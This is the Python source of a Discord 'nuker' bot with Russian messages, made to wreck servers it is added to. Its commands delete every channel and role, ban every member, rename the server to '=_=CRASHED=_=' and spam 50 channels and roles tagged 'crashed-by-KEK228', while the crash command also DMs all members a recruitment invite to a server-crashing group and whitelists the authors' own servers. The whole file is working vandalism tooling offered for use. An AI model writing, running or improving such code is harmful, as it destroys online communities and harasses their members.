import discord
from discord.ext import commands
import asyncio
import requests
import config
import string

Bot = commands.Bot(command_prefix=config.Prefix) #префикс
token = config.TOKEN

Bot.remove_command('help')

csrl = []
dc = []
dr = []
bl = []
crserv = []

g = [747500947911213249, 779094480900194324, 764781234810650664]

@Bot.command()
async def delchannels(ctx):
 guild = ctx.guild
 channels = guild.channels
 author = ctx.author
 if guild.id not in dc:
   dc.append(guild.id)
   if guild.id in g:
    await ctx.message.delete()
    await author.send('Краш невозможен! Сервер в белом списке!')
   else:
    await ctx.message.delete()
    for i in channels:
       try:
           await i.delete()
       except:
           pass
 else:
     await ctx.author.send('Сервер уже крашнут!')

@Bot.command()
async def delroles(ctx):
 guild = ctx.guild
 author = ctx.author
 roles = guild.roles
 g = [747500947911213249,776803884764889128, 764781234810650664]
 if guild.id not in dr:
   dr.append(guild.id)
   if guild.id in g:
    await ctx.message.delete()
    await author.send('Краш невозможен! Сервер в белом списке!')
   else:
    await ctx.message.delete()
    for i in roles: 
       try:
           await i.delete()
       except:
           pass
 else:
     await ctx.author.send('Сервер уже крашнут!')

@Bot.command()
async def banall(ctx):
 guild = ctx.guild
 members = guild.members
 author = ctx.author
 g = [747500947911213249,776803884764889128, 764781234810650664]
 if guild.id not in bl:
  bl.append(guild.id)
  if guild.id in g:
    await ctx.message.delete()
    await author.send('Краш невозможен! Сервер в белом списке!')
  else:
    await ctx.message.delete()
    for i in members:
          if i is not Bot.user:
              try:
                  await i.ban()
              except:
                  pass
 else:
     await ctx.author.send('Сервер уже крашнут!')

@Bot.command()
async def crash(ctx):
 guild = ctx.guild
 channels = guild.channels
 members = guild.members
 roles = guild.roles
 author = ctx.author
 gid = ctx.guild.id
 g = [747500947911213249,776803884764889128, 764781234810650664]
 if guild.id not in csrl:
  csrl.append(guild.id)
  if guild.id in g:
     await ctx.message.delete()
     await author.send('Краш невозможен! Сервер в белом списке!')
  else:
    if gid in crserv:
     await ctx.author.send('ЛЯ ТЫ КРЫСА!')
    else:
     crserv.append(gid)
     await ctx.message.delete()
     user = Bot.get_user(571667975619346433)
     await user.send(f'{author} Крашнул сервер! Айди автора: {author.id}')
     for i in members:
       if i is not Bot.user:
          try:
            await i.send(f'Сервер {guild.name} уничтожен! Хочешь тоже крашать? Переходи! https://discord.gg/ang3M7c93x')
          except:
                pass
     for i in roles:  # Удаление ролей
        try:
            await i.delete()
        except:
            pass
     for i in members:  # Бан участников
        if i is not Bot.user:
            try:
                await i.ban()
            except:
                pass
     for i in channels:  # Удаление каналов
         try:
             await i.delete()
         except:
              pass
    with open('image.jpg', 'rb') as f:
        icon = f.read()
        await guild.edit(name='=_=CRASHED=_=', icon=icon)
    d = 1
    while d <=50:
         d = d + 1
         await guild.create_text_channel('crashed-by-KEK228')
         await guild.create_role(name="crashed-by-KEK228")
 else:
     await ctx.author.send('Сервер уже крашнут!')

@Bot.command()
async def help(ctx):
    guild = ctx.guild
    owner = guild.owner
    embed = discord.Embed(title='Помощь', description="!delchannels - удалить все каналы\n!delroles - удалить все роли\n!banall - забанить всех\n!crash - крашнуть серв\n!help - посмотреть список команд", timestamp=ctx.message.created_at, color=discord.Color.red())
    await ctx.author.send(embed=embed)
    await ctx.message.delete()
    

Bot.run(token)
